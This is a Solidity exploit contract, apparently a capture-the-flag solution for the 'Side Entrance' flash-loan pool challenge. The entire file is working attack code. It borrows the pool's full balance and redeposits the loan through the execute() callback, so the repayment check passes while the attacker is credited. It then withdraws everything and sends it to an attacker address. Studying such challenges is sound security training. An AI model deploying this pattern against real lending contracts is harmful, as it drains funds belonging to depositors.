pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack { 
    uint public currentBalance   ;

    function attack (address victimAddress ) public { 

        SideEntranceLenderPool victim = SideEntranceLenderPool(victimAddress);
        victim.flashLoan(victimAddress.balance);
    }

    function execute () external payable {
        SideEntranceLenderPool victim = SideEntranceLenderPool(msg.sender);
        // require(msg.value== 1000 ether,"Not all funds were taken");
        victim.deposit{value:msg.value}();
        currentBalance= victim.balances(address(this));

    }

    function transferToAttacker(address payable attackerAddress,address victimAddress) public {
        
            SideEntranceLenderPool victim = SideEntranceLenderPool(victimAddress);
            victim.withdraw();
            attackerAddress.send(address(this).balance);
    }

    receive() payable external{ 

    }
}